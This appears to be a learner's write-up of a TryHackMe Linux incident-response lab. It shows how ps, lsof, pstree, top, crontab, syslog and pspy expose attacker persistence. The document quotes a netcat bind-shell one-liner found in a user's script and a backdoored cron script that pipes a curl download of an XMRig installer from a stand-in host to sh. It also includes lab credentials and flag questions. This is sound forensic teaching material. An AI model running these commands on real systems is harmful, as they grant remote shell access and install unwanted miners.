# Linux Process Analysis

## Investigation Setup

### Scenario

Expanding our investigation from the Linux File System Analysis room, we have been tasked once again by Penguin Corp to perform live analysis on a Linux workstation during a suspected breach. In this scenario, our focus shifts to examining processes, services, scheduled tasks, autostart scripts, and application artefacts on the workstation.  
We aim to forensically analyse these components to determine any signs of unauthorised modifications, malicious activities, or persistence mechanisms.

By analysing the leftover artefacts and identifying various persistence and backdoor mechanisms, we intend to provide Penguin Corp with a clear understanding of the extent and nature of the compromise.

**credentials** : investigator;TryHackMe123!

### Securing the Environment

While we perform live forensic analysis on this system, it is essential to note that in this assumed scenario, we have already acquired all necessary backups and have isolated the system from the network to prevent further compromise or tampering.

As this is a potentially compromised host, it is a good idea to ensure we are using known good binaries and libraries to conduct our information gathering and analysis.  
Often, this can be done by mounting a USB or drive containing binaries from a clean Debian-based installation (since the compromised workstation is Ubuntu).  
This has been simulated on the attached VM by copying the /bin, /sbin, /lib, and /lib64 folders from a clean installation into the /mnt/usb mount on the affected system.

This effort aims to mitigate the risk of inadvertently executing malicious code or compromised utilities on systems.  
Suppose an attacker gains privileged access to a system. In that case, they may replace or alter existing utilities with malicious binaries or libraries that could cause further harm when run by an unsuspecting investigator.  
By using a trusted source, it enhances the reliability and integrity of our investigation.

#### Modifying Environment Variables to Include Trusted Paths

We can modify our PATH and LD_LIBRARY_PATH (shared libraries) environment variables to use trusted binaries:

`:> investigator@tryhackme:~$ export PATH=/mnt/usb/bin:/mnt/usb/sbin`  

`:> investigator@tryhackme:~$ export LD_LIBRARY_PATH=/mnt/usb/lib:/mnt/usb/lib64`

### Setup Questions  

After updating the PATH and LD_LIBRARY_PATH environment variables, run the command check-env. What is the flag that is returned in the output?  

## Processes

In Linux, a process is a running instance of a program. When you execute a program or command in Linux, the operating system creates a process for running that program.  
Each process has its unique identifier called a **Process ID (PID)**, which helps the operating system to manage and track it.

Processes can have parent-child relationships, forming a hierarchical structure.  
When one process spawns another process (for example, when one shell session spawns an additional process in a subshell), the new process becomes the child of the process that created it, referred to as its parent.  
This relationship is essential for managing processes and resource allocation within the operating system.

Various tools and utilities can be employed to inspect the running processes on a system.  
Using this enumeration, we can seek to identify malicious activity or suspicious parent-child process relationships.

### ps

reports a snapshot of the active processes on the system.  
displays information about processes associated with the current (active running) console session  
can also be used to gather system-wide and other user's process information  
retrieves this information by reading files in the `/proc` virtual filesystem, a hierarchical directory structure corresponding to each process on the running system.  

#### Viewing Processes with ps

`:> investigator@tryhackme:~$ ps`  

    PID TTY          TIME CMD
    1335 pts/0    00:00:00 bash
    1745 pts/0    00:00:00 ps

provides its output in a table-like format with the following columns:  

**PID**  : A unique identifier (Process ID) for each process.
**TTY**  : The terminal associated with the process.
**TIME** : The cumulative CPU time consumed by the process.
**CMD**  : The command associated with the process.

View processes specific to a user (Janice) by using the `-u` or `--user` option followed by the user's username:  

#### Viewing Janice's Processes with ps

`:> investigator@tryhackme:~$ ps -u janice`  

        PID TTY          TIME CMD
        773 ?        00:00:00 sh
        775 ?        00:00:00 abzkd83o4jakxld
        781 ?        00:00:00 cat
        782 ?        00:00:00 sh
        783 ?        00:00:00 nc

        

`-eFH` options combine several options to return a comprehensive overview of all processes running on the system in a hierarchical format, regardless of the terminal or session to which they are attached.  
This set of options makes it a valuable tool for system monitoring and forensic analysis:  

#### Viewing All Processes with ps

`-e` : select all processes  
`-F` : return the results in extra full format  
`-H` : show the process hierarchy (forest)  

This command will produce a large output, it is best to paginate the output by piping it to `less` or using `grep` to filter the output.  

`:> investigator@tryhackme:~$ ps -eFH`  

    UID          PID    PPID  C    SZ   RSS PSR STIME TTY          TIME CMD
    root           2       0  0     0     0   0 15:37 ?        00:00:00 [kthreadd]
    root           3       2  0     0     0   0 15:37 ?        00:00:00 [rcu_gp]
    ...
    root         706       1  0  2137  2740   0 22:07 ?        00:00:00 /usr/sbin/cron -f
    root         769     706  0  2570  2596   0 22:08 ?        00:00:00 /usr/sbin/CRON -f
    janice       773     769  0   654   516   0 22:08 ?        00:00:00 /bin/sh -c /home/janice/abzkd83o4jakxld.sh
    janice       775     773  0  2156  2148   0 22:08 ?        00:00:00 /bin/bash /home/janice/abzkd83o4jakxld.sh
    janice       781     775  0  1845   396   0 22:08 ?        00:00:00 cat /tmp/f           
    janice       782     775  0   654   452   0 22:08 ?        00:00:00 /bin/sh -i 
    janice       783     775  0   815   664   0 22:08 ?        00:00:00 nc -l 0.0.0.0 4444 
    ...
    ubuntu      1681       1  0 39155  5728   0 15:39 ?        00:00:00 /usr/libexec/gvfsd-metadata

Note: PIDs are sequentially assigned, you will likely see different PID and PPID values.  

When scrolling through the list, we can identify several suspicious processes (781, 782 and 783) that may hint at malicious activity.  
We can also identify that these three processes have the parent of PID: 775, which is useful for our notes.

##### nc -l 0.0.0.0 4444

Netcat listens on all available network interfaces (open to connections from any IP address) on port 4444.  
Seeing this command in a running process is suspicious as it can suggest an attempt to establish unauthorised access to the system through a bind shell.  
A bind shell works when a host binds to a specific port, awaits incoming network connections, and spawns a shell, granting the connecting entity command-line access to the host.

##### cat /tmp/f and /bin/sh -i

These two commands may suggest how the bind shell spawns its eventual command-line (/bin/sh) shell for whoever connects to the Netcat listener.  
The file creation of `/tmp/f` suggests an attacker may have created a named pipe to transmit data bidirectionally between processes, as it is a common indicator of a bind shell one-liner.  

We can further confirm that a named pipe was created by listing the file and noting the `p` file type indicator in the permissions section of the output, which denotes a named pipe:  

#### Listing the Named Pipe in the /tmp Folder

`:> investigator@tryhackme:~$ ls -l /tmp/f`  

    prw-rw-r-- 1 janice janice 0 Mar 13 15:54 /tmp/f

Putting these processes together, we can identify that the Janice user has executed a bind shell listener to provide a connecting party command-line access to the host.

### lsof (List Open Files)

report a list of all open files and their associated processes within the running system.  

`:> investigator@tryhackme:~$ sudo lsof -p 783`  


    COMMAND PID   USER   FD   TYPE DEVICE SIZE/OFF    NODE NAME
    nc      783 janice  cwd    DIR  202,1     4096 1024049 /home/janice
    nc      783 janice  rtd    DIR  202,1     4096       2 /
    ...
    nc      783 janice    0r  FIFO   0,13      0t0   28393 pipe
    nc      783 janice    1w  FIFO  202,1      0t0    3437 /tmp/f
    nc      783 janice    2u   REG  202,1        0    2621 /tmp/#2621 (deleted)
    nc      783 janice    3u  IPv4  28400      0t0     TCP *:4444 (LISTEN)


Note: Replace `783` with the PID you identified earlier, executing nc -l 0.0.0.0 4444.

The above output tells us a couple of important things.  
It confirms the existence of named pipes (FIFO) associated with the /tmp/f file, which are being written to and read from.  
It indicates that the process is listening on TCP port 4444, indicating that it might be functioning as a server or a listener.  
This information aligns with our findings of a bind shell setup where data transmission is facilitated bidirectionally between processes using named pipes.  

### pstree

displays processes visually as a tree, showing the parent-child relationships between processes  
can help identify the origin of the suspicious processes and understand their relationship to other processes in the system.

perform a deeper process analysis of the parent process we identified above (PID: 775) using pstree and provide options to list its parent processes (-s) and their corresponding PIDs (-p):  

#### Illustrating the Process Hierarchy with pstree

`:> investigator@tryhackme:~$ pstree -p -s 775`  

    systemd(1)───cron(706)───cron(769)───sh(773)───abzkd83o4jakxld(775)─┬─cat(781)
                                                                        ├─nc(783)
                                                                        └─sh(782)

Note: Replace `775` with the PID of the parent process you identified earlier.

In the above output, we can see a hierarchical view of the process tree, where each process is listed along with its parent process and PID.  
From this tree, we can see that the Netcat (nc) process was spawned by intermediary processes (abzkd83o4jakxld and sh), which are executing scripts spawned by a cronjob (cron).  

Now that we have a better idea of how the Netcat process was spawned, we can focus on the parent shell and cron processes to see the commands that were run.  
To do this, we can return to the ps command in full-format listing (-f) and filter by those specific PIDs we found in the pstree output:  

#### Listing Processes with ps

`:> investigator@tryhackme:~$ ps -f 769 773 775 783`  

    UID          PID    PPID  C STIME TTY      STAT   TIME CMD
    root         769     706  0 22:08 ?        S      0:00 /usr/sbin/CRON -f
    janice       773     769  0 22:08 ?        Ss     0:00 /bin/sh -c /home/janice/abzkd83o4jakxld.sh
    janice       775     773  0 22:08 ?        S      0:00 /bin/bash /home/janice/abzkd83o4jakxld.sh
    janice       783     775  0 22:08 ?        S      0:00 nc -l 0.0.0.0 4444

Note: Replace 769, 773, 775, and 783 with the PIDs you identified with pstree.

This output concludes that a suspicious shell script (abzkd83o4jakxld.sh) has been executed from the /home/janice directory.  
If we view the contents of this file, we can confirm that it matches the indicators of a common bind shell one-liner, as discussed earlier:  

#### Viewing the Contents of the Suspicious .sh Script

`:> investigator@tryhackme:~$ cat /home/janice/abzkd83o4jakxld.sh`  

    #!/bin/bash

    # Set the path to the lock file
    LOCKFILE="/tmp/abzkd83o4jakxld.lock"

    # Check if lock file exists
    if [ -e "$LOCKFILE" ]; then
        echo "Script is already running. Exiting."
        exit 1
    fi

    # Create lock file
    touch "$LOCKFILE"

    # Main command
    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 4444 > /tmp/f

    # Remove lock file
    rm -f "$LOCKFILE"

In summary, this main command sequence (under # Main command) creates a named pipe, reads from it, and passes the data to a shell (/bin/sh) in interactive mode (-i).  
The remaining bits of the file seem complicated, but establishing a lock file is just one way to ensure that only one instance of the bind shell runs at a time.  
The attacker of this scenario likely set up this command sequence to establish persistence and enable future remote connections for malicious activities.

### top

Provides a continuously updated display of system processes sorted by various criteria, such as CPU or memory usage.  
Dynamically refreshes its output, allowing you to observe real-time changes.  
Offers a powerful interactive interface to sort and filter processes on the fly.

We can filter the output to only show processes related to the "Janice" user (-u janice), update dynamically every 5 seconds (-d 5), and display the full command paths (-c):

#### Listing Real-Time Processes with top

`:> investigator@tryhackme:~$ top -d 5 -c -u janice`  

    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+  COMMAND
    773 janice    20   0    2616    516    448 S   0.0   0.1   0:00.00 /bin/sh -c home/janice/abzkd83o4jakxld.sh
    775 janice    20   0    8624   2148   1904 S   0.0   0.2   0:00.00 /bin/bash /home/janice/abzkd83o4jakxld.sh 
    781 janice    20   0    7380    396    328 S   0.0   0.0   0:00.03 cat /tmp/f 
    782 janice    20   0    2616    452    388 S   0.0   0.0   0:00.00 /bin/sh -i 
    783 janice    20   0    3260    656    568 S   0.0   0.1   0:00.00 nc -l 0.0.0.0 4444

You can press the q key to exit this view.

### Identifying Suspicious Parent-Child Process Relationships

Identifying suspicious parent-child process relationships is essential to the IR process and can quickly confirm or rule out malicious activity.  
The best way to recognise what is abnormal is to establish a baseline for normal behaviour specific to your systems, environment, and organisation.  
This baseline should include typical processes, relationships, and resource usage under normal operating conditions.

For example, if an Apache web server process owned by the standard www-data user spawns a bash child process, it could indicate malicious activity such as a command injection or remote code execution.  
In a typical web server environment, the Apache process handles incoming HTTP requests and serves web pages or executes server-side scripts, usually within a restricted environment.  
However, if a bash shell is spawned as a child process of the Apache server process, it suggests that the server may have been compromised or that malicious code is being executed.

In most cases, monitoring tools and SIEM solutions can be tuned proactively to baseline the typical behaviour of the system and alert on process and process relationship occurrences that stray from this baseline.

### ps Questions

Which command lists all open files and the processes that opened them?

Use pstree to list out the process hierarchies. What is the name of the nc processes parent?  

## Cronjobs

For thorough documentation on reading and creating Cron expressions, check out [Crontab Guru](https://crontab.guru/).  

Cronjobs are scheduled tasks executed automatically at predefined intervals by the cron daemon.  
The cron daemon is a background process responsible for managing cronjobs based on configuration files known as crontabs.  
Users can have their crontab file stored in the `/var/spool/cron/crontabs` directory.  
The main crontab file at `/etc/crontab` governs system-wide cronjobs.

Cron entries follow a specific format consisting of space-separated fields.  

### Example Cron Entry for Bob

    10 05 * * * /home/bob/backup_tmp.sh

#### Explanation

**Minute (10)** : The first field specifies the minute when the command will be executed. In this case, it's 10, indicating that the command will be executed at the 10th minute of the hour. 

**Hour (05)** : The second field specifies the hour when the command will be executed. It's 05, indicating that the command will be executed at 5:10 AM.  

**Day of the Month (*)** : The third field specifies the day of the month when the command will be executed. In this case, it's *, a wildcard value, meaning it will be executed every day of the month. You can also specify a specific day of the month using numbers from 1 to 31. For example, to execute the command on the 15th day of every month, you would use 15.  

**Month (*)** : The fourth field specifies the month when the command will be executed. Here, it's also *, meaning the command will be executed monthly. You can specify months using either numbers (1 for January, 2 for February, etc.) or shorthand names (Jan for January, Feb for February, etc.). For example, you can use either 2 or Feb to execute the command only in February.  

**Day of the Week (*)** : The fifth field specifies the day of the week the command will be executed. In this case, it's *, which means the command will be executed every day of the week. You can also specify days of the week using numbers from 0 to 7, where 0 and 7 represent Sunday, 1 represents Monday, and so on. Alternatively, you can use the shorthand names (Sun, Mon, Tue, etc.). For example, you can use either 1 or Mon.  

**Command (/home/bob/backup_tmp.sh)** : The final field contains the command to be executed.  

Additionally, it's important to note that the system-level `/etc/crontab` differs from user-level crontabs.  
System-wide crontabs will include an additional field specifying the user under which the command will run (i.e., root or www-data).  

The cron schedule is configured to execute the command /home/bob/backup_tmp.sh at 5:10 AM every day.  

Cronjobs is a target for attackers seeking to establish persistence or escalate privileges on a system.  
Crucial for incident responders and forensic analysts to know how to analyse the system for any suspicious cronjobs or scheduled tasks.  

### Cron Configuration Files

We can begin our investigation into cronjobs on the system by first taking inventory of the system's cron configuration files.  
Fortunately, this process is relatively straightforward as these files are typically stored in known locations.

#### Viewing /etc/crontab

`:> investigator@tryhackme:~$ cat /etc/crontab`  

    ...
    SHELL=/bin/sh
    PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
    ...
    */5 * * * * root /var/tmp/backup

The above contents of /etc/crontab show the default shell and path variables used to execute commands.  

Below that, we can see a single cronjob entry:

    */5 * * * * root /var/tmp/backup

By reading the syntax above, we can determine that the `/var/tmp/backup` file will execute every five minutes as root. The `*/5` is a way within cron's syntax to specify every fifth minute.  

This finding invokes immediate suspicion as a system-level cronjob executes a command with root privileges in the /var/tmp directory.  
This is a world-writable directory, meaning that any user can modify or replace the backup file that is being executed.  
This could be a misconfiguration that an attacker abused to escalate privileges or a persistence method created by the attacker after gaining root access to the system.  
When viewing the contents of this backup file, we can determine suspicious additions to the script:  

#### Viewing the Contents of /var/tmp/backup

`:> investigator@tryhackme:~$ cat /var/tmp/backup`  

    #!/bin/bash

    tar -czf web_backup.tar.gz /var/www/html && curl -sSL http://h4x0rcr7pt.thm/install-xmrig.sh | sh

Although the backup script initially appears to perform a legitimate backup operation, an additional command has been appended to download and execute an install script via curl.  
From the name of the script, it appears to be related to the XMRig cryptocurrency mining software and warrants further investigation.  
This example illustrates a common tactic attackers use to leverage compromised systems for unauthorised cryptocurrency mining.  

Next, additional system cronjob directories are important for a thorough analysis.  
These directories are found under the /etc/ directory with the following naming convention:

*  **/etc/cron.hourly/** - System cronjobs that run once per hour.
*  **/etc/cron.daily/** - System cronjobs that run once per day.
*  **/etc/cron.weekly/** - System cronjobs that run once per week.
*  **/etc/cron.monthly/** - System cronjobs that run once per month.
*  **/etc/cron.d/** - Additional custom system cronjobs.

With these locations in mind, we can list out any configured cronjobs with the ls command:

#### Listing Additional Cronjobs

`:> investigator@tryhackme:~$ ls /etc/cron.d`  

    anacron  e2scrub_all  popularity-contest  

`:> investigator@tryhackme:~$ ls /etc/cron.hourly`  

    beacon  

`:> investigator@tryhackme:~$ ls /etc/cron.daily`  

    0anacron  apt-compat    cracklib-runtime  logrotate  popularity-contest  

    apport    bsdmainutils  dpkg              man-db     update-notifier-common  

`:> investigator@tryhackme:~$ ls /etc/cron.weekly`  

    0anacron  man-db  update-notifier-common  

`:> investigator@tryhackme:~$ ls /etc/cron.monthly`  

    0anacron

In the output above, most of these cronjobs look benign - however, it's always important to investigate their contents to be sure.  
Similar to processes, this is why it's always essential to have a pre-established baseline in order to spot anomalies quickly.

#### /var/spool/cron/crontabs/

After investigating the system-level cronjobs, we can look at the various user-level cronjobs configured by users on the system.  
User-level cronjobs are specific to individual user configuration files and are managed independently of system-wide cronjobs.  
Each user with permission to use cron will have their file inside this directory, named after their username.

There are several ways to enumerate this information.  
The easiest way is to list the contents of the directory with sudo-privileges:

#### Listing User-Level Cronjobs

`:> investigator@tryhackme:~$ sudo ls -al /var/spool/cron/crontabs/`  

    total 28
    drwx-wx--T 2 root   crontab 4096 Mar 13 00:05 .
    drwxr-xr-x 5 root   root    4096 Oct 26  2020 ..
    -rw------- 1 bob    crontab 1157 Mar 13 00:05 bob
    -rw------- 1 elijah crontab 1122 Mar 13 00:02 elijah
    -rw------- 1 janice crontab 1132 Mar 12 23:38 janice
    -rw------- 1 root   crontab 1122 Mar 12 23:45 root
    -rw------- 1 ubuntu crontab 1225 Feb 27  2022 ubuntu

As seen in the above output, user-level cronjobs have been configured by several users on the system.

We can view the contents of these files separately (using cat) to analyse their contents, or we could use the crontab command.  
This command can manage, create, or view user-level cronjobs.  
The `-u` argument can be used to specify a specific user's cron configuration  
The `-l` argument can be used to display the contents of the cronjob.  

#### Viewing Janice's Configured Cronjobs

`:> investigator@tryhackme:~$ sudo crontab -l -u janice`  

    # m h  dom mon dow   command
    * * * * * /home/janice/abzkd83o4jakxld.sh

As seen in the above output, we have discovered the specific cronjob that executes the `abzkd83o4jakxld.sh` bind shell, which we identified in the previous task.

Using a clever one-liner command, we can quickly loop through the users on the system and identify if they have any user-level cronjobs configured.  
If so, we can output the contents of the cronjob entry to the terminal.  
This type of hybrid automation can help speed up investigations and ensure thorough coverage:  

#### Using a One-Liner to List User Cron Entries

`:> investigator@tryhackme:~$ sudo bash -c 'for user in $(cut -f1 -d: /etc/passwd); do entries=$(crontab -u $user -l 2>/dev/null | grep -v "^#"); if [ -n "$entries" ]; then echo "$user: Crontab entry found!"; echo "$entries"; echo; fi; done'`  

    ...
    janice: Crontab entry found!
    * * * * * /home/janice/abzkd83o4jakxld.sh

    bob: Crontab entry found!
    10 05 * * * /home/bob/backup_tmp.sh
    30 04 * * * /var/tmp/findme.sh
    ...

To break down this command, we are iterating over all of the users on the system by filtering out the entries in /etc/passwd.  
From each of these returned users, it iterates each user and fetches their crontab entries using the crontab command we ran earlier.  
If a crontab entry exists for that user, we will return their username and the entry from the crontab file.  

### Cron Execution Logs

Cron logs record the execution of scheduled tasks managed by the cron daemon and provide a chronological record of when cron jobs were executed, along with any associated output or error messages.  
From a forensic standpoint, these logs can be invaluable in uncovering execution artefacts of cronjobs and lead to discovering suspicious activities or system compromises.  
For example, suppose a malicious actor abused an existing cronjob or created a malicious cronjob and attempted to cover their tracks.  
In that case, the logs might reveal unusual patterns of execution or unexpected commands being run.

On Debian-based systems, cron execution logs are typically stored in `/var/log/syslog`.  
This file aggregates system logs, including messages from the cron daemon.  
In some Linux distributions, such as Red Hat Enterprise Linux (RHEL) and CentOS, these logs may be found in the aptly named `/var/log/cron`.

Because the system we're investigating stores cron logs in the syslog file, we can grep the contents and filter for any logs related to cron:  

#### Filtering Syslog for Cron Logs

`:> investigator@tryhackme:~$ sudo grep cron /var/log/syslog`

The above command will produce a large amount of output.  
It is a good idea to filter the results further based on specific criteria to focus on relevant information.  
Some example ideas to filter on include:  

#### Filtering Syslog for Failed Cron Logs

`:> investigator@tryhackme:~$ sudo grep cron /var/log/syslog | grep -E 'failed|error|fatal'`

The above command will filter out cron entries associated with failed job executions.  
In this case, there are no results - but this can be a useful method to catch anomalies.

We can also filter for specific users:  

#### Filtering Syslog for Bob's Cron Logs

 `:> investigator@tryhackme:~$ sudo grep cron /var/log/syslog | grep -i 'bob'`  

    Mar 13 00:04:35 tryhackme crontab[3016]: (root) LIST (bob)
    Mar 13 00:05:17 tryhackme crontab[3053]: (bob) BEGIN EDIT (bob)
    Mar 13 00:05:45 tryhackme crontab[3053]: (bob) END EDIT (bob)
    Mar 13 00:05:47 tryhackme crontab[3058]: (bob) BEGIN EDIT (bob)
    Mar 13 00:05:59 tryhackme crontab[3058]: (bob) REPLACE (bob)
    Mar 13 00:05:59 tryhackme crontab[3058]: (bob) END EDIT (bob)
    Mar 13 00:06:01 tryhackme cron[704]: (bob) RELOAD (crontabs/bob)
    Mar 13 00:06:32 tryhackme crontab[3259]: (root) LIST (bob)


The above command will filter cron entries specifically associated with Bob. Note that in the above output, we can even see the timestamps of when Bob's crontab file was modified.

### Pspy

Pspy is a powerful open-source tool used to monitor Linux processes without the need for root privileges.  
It captures and displays real-time information about running processes, including their execution commands, user IDs, process IDs (PIDs), parent process IDs (PPIDs), timestamps, and other relevant details.  
It operates by reading data directly from the /proc virtual filesystem, providing real-time insights into process activity without modifying system files or requiring elevated permissions.  

excellent for enumeration purposes  
incident responders can benefit from its ability to collect execution artefacts and catch short-lived processes.  
Due to its real-time monitoring, it can also detect processes generated by various cronjobs through the system, giving us more insight into which processes occur when cronjobs are run.  

It can be stopped by pressing Ctrl + C:  

#### Using pspy64 to Monitor Executions

`:> investigator@tryhackme$ pspy64`  

    pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

    Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)

    Draining file system events due to startup...
    done
    ...
    2024/03/13 19:38:45 CMD: UID=0     PID=1      | /sbin/init 
    2024/03/13 19:39:01 CMD: UID=0     PID=3396   | /usr/sbin/CRON -f 
    2024/03/13 19:39:01 CMD: UID=1003  PID=3403   | /bin/bash /home/janice/abzkd83o4jakxld.sh 
    2024/03/13 19:39:01 CMD: UID=1003  PID=3402   | /bin/sh -i 
    2024/03/13 19:39:01 CMD: UID=1003  PID=3401   | /bin/bash /home/janice/abzkd83o4jakxld.sh

        
Note: The output may appear stalled or paused for a few moments as it initialises.

This command will produce a large amount of continuous output as normal system operations occur.  
However, we can quickly note that the cronjobs on the system that we identified previously (such as /bin/bash /home/janice/abzkd83o4jakxld.sh) are detected.  

### Cronjobs Questions

Search around the system for suspicious system-level cronjob entries. What is the full URL of the C2 server?

List the user-level cronjobs in the system. What is the hidden flag in one of the scripts?

Use pspy64 to monitor executions occurring through the system. What is the decoded flag value that is echoed every 15 seconds?

## Services

In Linux, services refer to various background processes or daemons that run continuously, performing tasks such as managing system resources, providing network services, or handling user requests.  
For example, the cron daemon we analysed previously ran the cronjobs.  
Other common services include SSH (`sshd`) for secure shell or the Apache HTTP Server (`httpd`).  
Typically, services are configured using the system's service management utility - systemd or init.  
Some environments like BusyBox, however, do not use systemd.

Services can be a target for attackers if they can exploit vulnerabilities, abuse misconfigurations, or manipulate legitimate services to establish persistence or escalate privileges on the system.  
For example, attackers might create new malicious services or modify existing ones to inject or execute malicious commands during system startup or ad-hoc if they can start and stop the service.

As such, incident responders need to have a pre-established baseline to detect anomalies and locate artefacts related to service abuse.

### Enumerating Services

#### systemctl  

a utility in Linux used for controlling systemd and service managers.  
As mentioned earlier, systemd is a service management utility in Unix-based systems and, for the most part, has replaced the traditional init system in many distributions.  
As such, systemd is responsible for managing the startup processes, services, and daemons on a Linux system, and `systemctl` lets us manage these services directly.

We can perform a number of actions using `systemctl`, including:

- `systemctl start <service>` — Starts the specified service.
- `systemctl stop <service>` — Stops the specified service.
- `systemctl restart <service>` — Restarts the specified service.
- `systemctl enable <service>` — Enables the specified service to start automatically at boot.
- `systemctl disable <service>` — Disables the specified service from starting automatically at boot.
- `systemctl status <service>` — Displays the status of the specified service (e.g., Active, Inactive, Failed).

We can also use `systemctl` to iterate and query all the services on the system using the following syntax:

##### Listing All System Services**

    ```shell-session
    investigator@tryhackme:~$ sudo systemctl list-units --all --type=service

## Autostart Scripts

## Application Artefacts